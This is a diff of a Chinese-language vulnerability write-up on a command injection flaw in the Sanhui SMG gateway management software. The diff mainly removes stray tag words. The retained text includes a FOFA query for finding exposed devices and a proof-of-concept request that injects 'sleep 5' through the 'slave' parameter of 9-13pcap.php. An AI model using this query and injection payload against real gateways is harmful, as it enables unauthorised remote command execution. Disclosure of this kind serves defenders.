@@ -6,23 +6,13 @@ asset_dir: embedded-base64
 
 # 漏洞简介
 
-三汇SMG 网关管理[软件](#)是与三汇SMG系列数字网关产品配套的管理工具，是杭州三汇信息工程有限公司开发的一款高效、稳定、易用的网关管理软件。它专为三汇SMG系列数字网关设计，提供了全面的配置、监控、管理和维护功能，帮助用户轻松实现网关设备的远程管理和优化。由于 `9-13pcap.php` 参数 `slave` 的处理不当，导致[命令注入](https://mrxn.net/tag/rce)问题，攻击者可以通过远程发起攻击。
-
-软件
+三汇SMG 网关管理软件是与三汇SMG系列数字网关产品配套的管理工具，是杭州三汇信息工程有限公司开发的一款高效、稳定、易用的网关管理软件。它专为三汇SMG系列数字网关设计，提供了全面的配置、监控、管理和维护功能，帮助用户轻松实现网关设备的远程管理和优化。由于 `9-13pcap.php` 参数 `slave` 的处理不当，导致[命令注入](https://mrxn.net/tag/rce)问题，攻击者可以通过远程发起攻击。
 
 # fofa语法
 
 > `body="text ml10 mr20" && (title="网关管理软件" || title="Gateway Management")`
 
 # 漏洞分析
-
-深入探索
-
-script language
-
-脚本语言
-
-数据管理
 
 直接看 9-13pcap.php 关键业务逻辑实现部分
 
@@ -54,14 +44,6 @@ Content-Type: application/x-www-form-urlencoded
 
 slave_download=1&slave=+;sleep 5;+#+
 ```
-
-深入探索
-
-VPN 与远程访问
-
-网络监控与管理
-
-Linux
 
 执行 `sleep 5` 命令，成功延时 5 秒
 
